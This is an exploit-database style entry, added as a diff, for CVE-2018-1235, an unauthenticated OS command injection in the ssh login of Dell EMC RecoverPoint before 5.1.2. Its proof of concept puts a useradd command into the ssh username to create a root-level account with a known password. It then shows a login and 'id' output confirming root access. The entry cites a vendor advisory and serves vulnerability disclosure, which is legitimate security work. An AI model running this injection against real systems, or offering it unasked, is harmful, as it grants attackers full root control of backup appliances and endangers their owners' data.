@@ -1,0 +1,28 @@
+# Exploit Title: Dell EMC RecoverPoint < 5.1.2 - Remote Root Command Execution
+# Date: 2018-06-21
+# Version: All versions before RP 5.1.2, and all versions before RP4VMs 5.1.1.3
+# Exploit Author: Paul Taylor
+# Vendor Advisory: DSA-2018-095
+# Vendor KB: https://support.emc.com/kb/521234
+# Github: https://github.com/bao7uo/dell-emc_recoverpoint
+# Website: https://www.foregenix.com/blog/foregenix-identify-multiple-dellemc-recoverpoint-zero-day-vulnerabilities
+# Tested on: RP4VMs 5.1.1.2, RP 5.1.SP1.P2
+# CVE: CVE-2018-1235
+ 
+# 1. Description
+# An OS command injection vulnerability exists in the mechanism which processes usernames 
+# which are presented for authentication, allowing unauthenticated root access via 
+# the ssh service.
+ 
+# 2. Proof of Concept
+# Inject into ssh username.
+# N.B. combined length of new username+password is limited to 21 due to injection length limitations
+
+$ ssh '$(useradd -ou0 -g0 bao7uo -p`openssl passwd -1 Secret123`)'@192.168.57.3
+Password: ^C
+$ ssh bao7uo@192.168.57.3
+Password: Secret123
+Could not chdir to home directory /home/bao7uo: No such file or directory
+root@recoverpoint:/# id
+uid=0(root) gid=0(root) groups=0(root)
+root@recoverpoint:/#
